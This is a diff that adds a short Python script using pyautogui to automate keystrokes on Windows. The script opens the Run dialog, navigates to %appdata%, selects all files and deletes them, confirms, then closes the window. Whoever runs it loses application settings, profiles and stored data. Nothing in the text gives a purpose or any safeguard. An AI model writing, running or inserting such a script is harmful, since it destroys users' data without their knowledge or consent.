@@ -1,0 +1,13 @@
+import pyautogui as gui
+from time import sleep as sl
+gui.sleep(0.5)
+
+gui.hotkey('win', 'r')
+sl(1)
+gui.write('%appdata%')
+gui.press('enter')
+gui.hotkey('ctrl', 'a')
+gui.press('delete')
+gui.press('enter')
+sl(3)
+gui.hotkey('alt', 'F4')
